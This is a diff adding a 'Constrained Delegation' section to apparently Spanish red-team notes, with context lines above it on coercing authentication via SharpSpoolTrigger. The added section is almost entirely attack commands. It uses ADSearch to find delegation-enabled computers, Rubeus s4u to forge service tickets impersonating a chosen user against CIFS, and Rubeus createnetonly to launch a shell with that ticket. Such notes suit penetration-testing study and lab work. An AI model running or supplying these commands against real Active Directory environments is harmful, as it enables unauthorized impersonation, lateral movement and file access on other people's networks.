@@ -332,3 +332,17 @@ Forzar la autenticacion de un equipo a nosotros (desde otro equipo)
 ```
 execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe TARGET LISTENER
 ```
+## Constrained Delegation
+
+Mirar si cualquier usuario del equipo puede impersonar el servicio "CIFS" (permite listar y transferir archivos)
+```
+execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
+```
+Coger el TGT de la maquina y solicitar un TGS
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:usuario_a_impersonar /msdsspn:cifs/equipo /user:maquina /ticket: /nowrap
+```
+Impersonar un proceso con el ticket
+```
+execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain: /username:usuario_a_impersonar /password:FakePass /ticket:
+```
